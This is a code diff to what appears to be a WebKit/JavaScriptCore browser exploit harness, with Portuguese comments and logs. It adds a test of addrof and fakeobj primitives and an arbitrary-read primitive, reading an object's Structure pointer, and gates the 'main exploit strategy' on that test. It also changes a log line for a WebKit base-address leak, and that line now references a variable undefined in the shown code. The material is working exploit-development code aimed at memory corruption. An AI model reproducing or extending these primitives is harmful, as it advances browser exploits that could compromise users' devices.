@@ -6,6 +6,7 @@ import {
 } from './script3/testArrayBufferVictimCrash.mjs';
 import { AdvancedInt64, setLogFunction } from './utils.mjs'; // Keep AdvancedInt64 for JIT test and import setLogFunction
 import { JSC_OFFSETS } from './config.mjs'; // Import JSC_OFFSETS for detailed logging in core_exploit
+import { addrof_core, initCoreAddrofFakeobjPrimitives, arb_read } from './core_exploit.mjs'; // Importar addrof_core, initCoreAddrofFakeobjPrimitives, arb_read
 
 // --- Local DOM Elements Management ---
 const elementsCache = {};
@@ -84,6 +85,55 @@ async function testJITBehavior() {
     log("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
 }
 
+// --- NOVO: Teste Isolado da Primitiva addrof_core com objeto simples ---
+async function testIsolatedAddrofCore(logFn, pauseFn, JSC_OFFSETS_PARAM) {
+    const FNAME = 'testIsolatedAddrofCore';
+    logFn(`--- Iniciando Teste Isolado da Primitiva addrof_core e leitura de Structure* de objeto simples ---`, 'test', FNAME);
+
+    let success = false;
+    try {
+        logFn(`Inicializando primitivas addrof/fakeobj.`, 'info', FNAME);
+        initCoreAddrofFakeobjPrimitives();
+        await pauseFn(SHORT_PAUSE);
+
+        const test_object = { p1: 0x11223344, p2: "Hello World", p3: [1, 2, 3] };
+        logFn(`Criado objeto de teste: ${JSON.stringify(test_object)}`, 'info', FNAME);
+        await pauseFn(SHORT_PAUSE);
+
+        logFn(`Obtendo endereço do objeto de teste usando addrof_core...`, 'info', FNAME);
+        const object_addr = addrof_core(test_object);
+        logFn(`Endereço retornado por addrof_core: ${object_addr.toString(true)}`, 'leak', FNAME);
+
+        if (object_addr.equals(AdvancedInt64.Zero) || object_addr.equals(AdvancedInt64.NaNValue)) {
+            logFn(`ERRO: addrof_core retornou endereço inválido para test_object.`, 'error', FNAME);
+            throw new Error("addrof_core returned invalid address.");
+        }
+        await pauseFn(SHORT_PAUSE);
+
+        // Tentativa de ler o ponteiro da Structure* no offset 0x8 (JSCell::STRUCTURE_POINTER_OFFSET)
+        logFn(`Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto...`, 'info', FNAME);
+        const structure_ptr_addr = object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
+        const structure_ptr_val = await arb_read(structure_ptr_addr, 8); // Requer arb_read funcional
+        logFn(`Valor lido no offset da Structure*: ${structure_ptr_val.toString(true)}`, 'leak', FNAME);
+
+        if (structure_ptr_val.equals(AdvancedInt64.Zero) || structure_ptr_val.equals(AdvancedInt64.NaNValue)) {
+            logFn(`ALERTA: Ponteiro da Structure* lido como zero/NaN. Isso indica que addrof_core pode não estar retornando um ponteiro de heap direto, ou o offset está incorreto, ou há um problema com tagging de JSValue.`, 'warn', FNAME);
+            success = false; // Não é um sucesso total se a leitura da structure falha
+        } else {
+            logFn(`SUCESSO PARCIAL: Endereço do objeto obtido e leitura do possível ponteiro da Structure* (${structure_ptr_val.toString(true)}) não é zero/NaN.`, 'good', FNAME);
+            success = true; // Indica que a primitiva addrof pode estar funcionando
+        }
+
+    } catch (e) {
+        logFn(`ERRO CRÍTICO no teste isolado de addrof_core: ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME);
+        success = false;
+    } finally {
+        logFn(`--- Teste Isolado da Primitiva addrof_core Concluído (Sucesso: ${success}) ---`, 'test', FNAME);
+    }
+    return success;
+}
+
+
 // --- Main Heisenbug Reproduction Strategy (formerly from runAllAdvancedTestsS3.mjs) ---
 async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
     const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43";
@@ -114,7 +164,7 @@ async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
         }
 
         if (webkitLeakResult) {
-            log(`  RUNNER R43(L): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkitLeakResult.webkitBaseAddress || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
+            log(`  RUNNER R43(L): Teste WebKit Base Leak (Best): ${webkitLeakResult.msg} (Base Candidata: ${webkit_base_address || 'N/A'}, Ponteiro Interno Etapa2: ${webkitLeakResult.internal_ptr_stage2 || 'N/A'})`, webkitLeakResult.success ? "vuln" : "warn", FNAME_RUNNER);
         } else {
             log(`  RUNNER R43(L): Teste WebKit Base Leak não produziu resultado ou não foi executado.`, "warn", FNAME_RUNNER);
         }
@@ -164,6 +214,17 @@ function initializeAndRunTest() {
                 // Execute JIT test first
                 await testJITBehavior();
                 await PAUSE(MEDIUM_PAUSE); // Pause to read JIT test log
+
+                // NOVO: Teste isolado da primitiva addrof_core
+                const addrof_test_passed = await testIsolatedAddrofCore(log, PAUSE, JSC_OFFSETS);
+                if (!addrof_test_passed) {
+                    log("Teste isolado da primitiva addrof_core falhou. Isso é crítico para a exploração. Abortando a cadeia principal.", 'critical');
+                    // Podemos decidir continuar ou não a estratégia principal com base neste resultado
+                    // Para depuração, talvez seja melhor abortar se isso falhar.
+                    runBtn.disabled = false;
+                    return;
+                }
+                await PAUSE(LONG_PAUSE); // Pausa mais longa para revisar logs do teste addrof
 
                 // Then run the main exploit strategy
                 await runHeisenbugReproStrategy_TypedArrayVictim_R43();
